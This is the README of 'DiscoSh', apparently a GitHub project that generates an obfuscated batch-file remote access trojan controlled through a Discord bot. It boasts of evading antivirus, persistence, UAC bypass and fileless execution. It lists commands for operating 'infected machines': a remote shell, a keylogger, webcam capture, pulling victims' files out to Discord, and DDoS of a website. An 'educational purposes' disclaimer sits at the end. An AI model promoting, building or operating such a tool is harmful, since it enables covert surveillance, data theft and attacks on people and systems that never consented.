# DiscoSh

DiscoSh is a simple command line tool that can generate a nearly undetectable remote access trojan that connects to a Discord bot. DiscoSh generates a batch file stager which can be optionally obfuscated with [BatchGuard](https://github.com/cchash/BatchGuard) modules. The generated file can be used on its own and does not require additional code to be wrapped over it.

![image](https://media.discordapp.net/attachments/959762900443070485/960033794327461928/unknown.png)

If you have any issues using this tool, feel free to DM me on Discord (chash#0466) or [create a GitHub issue](https://github.com/cchash/DiscoShell/issues/new).

## Detection status
Virustotal result of generated file:
![image](https://media.discordapp.net/attachments/959762900443070485/960034118375190608/unknown.png)
[Link](https://www.virustotal.com/gui/file/541a70073404f35f6c0500d68de377d01dea3571f241723bb5975720c39dead8)

Also tested on a VM against Windows Defender, Avast and AVG.

None of the above guarantee that the generated file is fully undetectable.

## Features
- Persistence
- UAC bypass
- Fileless

\+ Can perform all things described in the [Discord bot commands](#discord-bot-commands) section.

## Discord bot commands
You can use the following commands to control infected machines via a Discord bot.

Note: Prefix can be customised
```
get : Get username, machine name and screenshot of all infected machines.
getcam : Get snapshot from all video sources on specified machine.
getfile {machine_name} {file_path} : Upload file located in {file_path} on specified machine to Discord.
ipinfo {machine_name} : Get IP address and geolocation of specified machine.

shell {machine_name} : Start remote shell on specified machine.
command {machine_name} {command} : Execute command on specified machine.

startkeylogger {machine_name} : Start keylogger on specified machine.
stopkeylogger {machine_name} : Stop keylogger on specified machine.
getkeylog {machine_name} : Get logged keys on specified machine.

startddos {website_url} : Make all infected machines send GET requests to specified URL.
stopddos : Make all infected machines stop sending GET requests.

getav {machine_name} : Get all antivirus products installed on specified machine.
uninfect {machine_name} : Uninfect specified machine.
```

## Disclaimer
This project was made for educational purposes and to test the capabilities of using Discord as a C2 server. If you choose to use this illegally/maliciously, it is your responsibility.
